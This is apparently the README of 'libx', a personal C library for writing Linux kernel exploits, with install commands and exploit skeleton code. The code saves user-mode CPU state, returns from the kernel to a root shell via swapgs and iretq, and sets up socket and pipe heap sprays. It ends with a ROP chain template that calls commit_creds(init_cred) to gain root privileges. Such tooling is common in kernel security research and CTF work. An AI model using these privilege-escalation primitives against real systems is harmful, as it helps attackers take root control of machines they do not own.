# libx

It's a personal c language library for kernel exploits. 

# Usage


Install `libx`
```bash
git clone git@github.com:n132/libx.git
cd libx
make
make install
```


uninstall `libx`
```bash
make clean
make uninstall
```

# Example

```c
//gcc main.c -o ./main -lx -w
#include "libx.h"
#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    int sk_skt[SOCKET_NUM][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        initSocketArray(sk_skt);
        initPipeBuffer(pipe_fd);
    }
#endif // 
int main(){
    
}
```

# back2user Template
```c
    p[idx++]  = rdi;
    p[idx++]  = init_cred                   - NO_ASLR_BASE + base;
    p[idx++]  = commit_creds                - NO_ASLR_BASE + base;
    p[idx++]  = common_interrupt_return +61 - NO_ASLR_BASE + base;
    p[idx++]  = *(size_t*) "RDI";
    p[idx++]  = *(size_t*) "RAX";
    p[idx++]  = shell;
    p[idx++]  = user_cs;
    p[idx++]  = user_rflags;
    p[idx++]  = user_sp;
    p[idx++]  = user_ss;
```




